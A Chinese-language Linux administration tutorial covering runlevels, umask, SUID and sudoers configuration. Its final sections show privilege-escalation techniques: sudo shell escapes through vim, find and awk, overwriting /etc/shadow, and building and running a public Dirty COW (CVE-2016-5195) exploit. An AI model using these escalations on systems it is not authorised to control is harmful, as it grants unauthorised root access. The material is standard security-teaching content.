## 运行级别

```zsh
# 运行级别0 关机
# 运行级别1 单用户，这个类似于windows安全模式，可以用于找回密码等操作。
# 运行级别2 不带网络的多用户，这种是不能联网的。
# 运行级别3 完整的多用户模式multi-user.target，我们平常使用的模式
# 运行级别4 保留
#运行级别5 桌面模式graphica1.target，桌面版系统就是这个模式，如果不想开机进入图形化界面，就需要修改运行级别，可以试一下
# 运行级别6 重启

# 切换运行级别
init
# 执行init6，就会重启，执行init0就会关机
# 查看运行级别
systemctl get-default
# 设置运行级别，设置之后一重启就改变了
systemctl set-default graphical.target # 设置默认运行级别为图形，注意没有安装图形化界面工具的话是不能切换为桌面版的
systemctl set-default multi-user.target # 设置默认运行级别为命令行
```



## 权限掩码

```zsh
# 查看掩码值
umask
# 这个值就决定着我们创建文件的初始权限
022
#可以看到，目录的初始权限为755，文件的初始权限为644。这些权限都是通过umask掩码计算得来的。
#文件权限计算：0666-0022=0644
#目录权限计算：0777-0022=0755

# 修改文件vim/etc/profile，找到umask来修改
root默认权限掩码022
普通用户默认权限掩码002
```



## 特殊权限

**suid**

suid，就是某个可执行文件有super超级管理员权限，这个文件普通用户也能用，含有suid的文件，可以让普通用户拥有该文件属主的执行权限，主要针对的是命令文件。比如：

```zsh
# suid令普通用户临时借用root用户的权限
chmod u+s /usr/sbin/passwd

```



**su和sudo**

```zsh
# 切换用户
su 用户 # 当前目录切换
su - 用户 # 切换到家目录
# 推出:exit

# sudo全称：superuserdo，它的作用是用来授权的。就是给普通用户高级权限用的。原因就是很多的操作，如果都需要root用户去做，太麻烦了，所以可以给普通用户做一些授权，普通用户操作就方便了。授权就用到了sudo，Sudo并不是一下子给用户很多权限，而是一个命令一个命令的授权。

# root用户才能修改这个配置。
1.配置/etc/sudoers
# 用户名所有终端=运行的用户身份命令ALL，ALL是所有指令，不能给所有的，不然权限太高了
jaden ALL=(ALL:ALL)		/bin/systemctl,/usr/bin/vim,/usr/sbin/reboot 
# 单独给指令权限，而且要写指令的绝对路径，逗号分割
# 修改完配置文件，保存退出之后，立马就生效了，不需要重启或者重新登录。
# 切换到普通用户，查看可以使用的授权命令
sudo -1
[jaden@localhost ~]S sudo -1
我们信任您已经从系统管理员那里了解了日常注意事项。
总结起来无外乎这三点：
#1）尊重别人的隐私。
#2）输入前要先考虑（后果和风险)。
#3）权力越大，责任越大。
```



## sudo提权

```zsh
vim # 命令模式执行：！/
	# 通过vim修改/etc/sudoers，授权ALL
	# 再通过vim进入一个文件
	# :输入指令，是可以直接输入系统指令的，前面加一个！即可，比如创建一个文件，！touch3.txt
	# 查看3.txt信息如下
	
[jaden@localhost ~]s 11
总用量0
-rw-r--r--1rootroot03月2717:053.txt#以root用户身份创建的文件
#如果在vim文件时，执行！/bin/bash，就进入到了root的命令终端，可以为所欲为。
#这就是sudo提权，但是sudo提权需要借助到可以执行系统指令的交互式的功能，比如vim。

示例2：
find
# sudo find . -exec bash \；#直接进入root的命令终端，这个指令退出root终端可能要退好几次才行，看find找到了几个文件，找到了3个文件，就输入三次exit才能退出。

示例3：
awk 
# sudo awk‘BEGIN {system("/bin/bash")}’ jaden.txt#直接进入到root命令终端，exit直接退出。

# 还有好多指令可以提权，比如cp命令也可以提权，将其他电脑上的/etc/shadow文件拷贝到这个系统中，密码就改掉了，再su切换到root即可等等，还有什么mv、vi、sed修改文件、chmod改重要文件权限等等这里就不多提了。大家可以试试，普通用户使用sudo来修改shadow文件的root用户的密码。
```



## 脏牛提权

```zsh
# dcow全称dirtycow，脏牛，原理：Linux内核的内存子系统在处理写入时复制（copy-on-write,Cow，组合起来是牛的意思）时产生了竞争条件。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问，所以大家都管这个提权方式叫做脏牛提权。原理这一块大家不需要掌握，会监测是否存在这个漏洞即可。

# 利用工具
https://github.com/gbonacini/CVE-2016-5195

# git clone下来后
make
./dcow -s 
```



